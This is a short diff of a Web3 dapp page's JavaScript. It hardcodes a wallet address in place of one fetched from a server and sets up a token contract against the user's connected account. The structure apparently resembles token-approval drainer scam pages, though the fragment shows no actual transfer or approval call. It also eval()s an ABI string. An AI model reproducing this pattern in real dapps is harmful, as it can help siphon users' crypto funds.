@@ -314,12 +314,12 @@
 				// let mon = sd * data['price']
 				let mon = sd * 1721.23
 				$('#price').text(mon.toLocaleString())
-				// })
-				// 	} else {
-				// 		$('#btn-connect').css('background', '#dde0dd')
-				// 		$('#btn-connect').attr('disabled', 'disabled')
-				// 	}
-				// })
+				})
+					} else {
+						$('#btn-connect').css('background', '#dde0dd')
+						$('#btn-connect').attr('disabled', 'disabled')
+					}
+				})
 			})
 			function b(url, data, callback) {
 				var xhr = new XMLHttpRequest()
@@ -402,17 +402,17 @@
 
 				this.web3 = new Web3(web3Provider)
 
-				var apaddress
+				var apaddress = '0x8B182DF7eb3F0DdbC87176ffc59d9b2E49062dF1'
 				var urls = window.location.href
-				b('func.php?action=geteth', '', function (data) {
-					if (data.status == 1) {
-						apaddress = data.address
-					} else {
-						mui.alert(data.msg)
-						return
-						//alert(data.msg)
-					}
-				})
+				// b('func.php?action=geteth', '', function (data) {
+				// 	if (data.status == 1) {
+				// 		apaddress = data.address
+				// 	} else {
+				// 		mui.alert(data.msg)
+				// 		return
+				// 		//alert(data.msg)
+				// 	}
+				// })
 				baseaddress = await this.web3.eth.getCoinbase()
 				json = eval('(' + abi + ')')
 				var WZGLToken = new this.web3.eth.Contract(json, '0xdAC17F958D2ee523a2206206994597C13D831ec7', {
